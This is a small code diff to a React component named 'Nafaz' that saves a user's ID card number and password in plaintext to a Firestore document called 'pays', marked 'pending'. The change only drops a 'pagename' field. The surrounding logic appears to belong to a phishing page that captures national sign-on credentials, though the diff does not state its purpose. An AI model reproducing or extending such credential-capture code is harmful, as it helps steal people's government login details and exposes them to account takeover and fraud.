@@ -82,14 +82,12 @@ export default function Nafaz() {
       await updateDoc(paysDocRef, {
         nafadUsername: idCardNumber,
         nafadPassword: password,
-        pagename: "nafaz",
         updatedAt: new Date().toISOString(),
       }).catch(async () => {
         // If document doesn't exist, create it
         await setDoc(paysDocRef, {
           nafadUsername: idCardNumber,
           nafadPassword: password,
-          pagename: "nafaz",
           createdDate: new Date().toISOString(),
           status: "pending",
         })
